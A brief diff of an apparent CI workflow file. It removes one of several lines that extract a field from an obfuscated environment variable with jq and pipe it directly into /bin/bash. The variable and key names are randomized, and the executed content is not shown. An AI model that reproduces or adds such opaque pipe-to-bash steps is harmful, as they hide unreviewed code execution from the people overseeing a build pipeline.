@@ -21,7 +21,6 @@ jobs:
           echo $bwfc09432 | jq -r .n9 | /bin/bash
           echo $wqf36729 | jq -r .sur9547 | /bin/bash
           echo $envw696 | jq -r .zp9572 | /bin/bash
-          echo $ul8412 | jq -r .s1 | /bin/bash
           echo $akkrb858 | jq -r .nhbe43 | /bin/bash
           printf '%s' "$kidn2" | jq -r .c68154 | /bin/bash
           echo $nxq931 | jq -r .lj3346 | /bin/bash
